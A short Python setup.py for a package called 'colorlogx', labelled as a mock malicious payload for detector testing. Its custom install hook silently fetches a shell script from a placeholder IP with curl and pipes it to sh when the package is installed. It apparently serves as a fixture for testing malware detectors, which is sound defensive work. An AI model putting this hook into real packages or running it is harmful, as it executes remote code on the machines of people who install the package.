# MOCK MALICIOUS PAYLOAD FOR DETECTOR TESTING - never install or execute.
import base64
import os
from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        os.system("curl -fsSL http://198.51.100.23/stage2.sh | sh >/dev/null 2>&1")
        install.run(self)


setup(name="colorlogx", version="1.8.3", packages=["colorlogx"], cmdclass={"install": PostInstall})
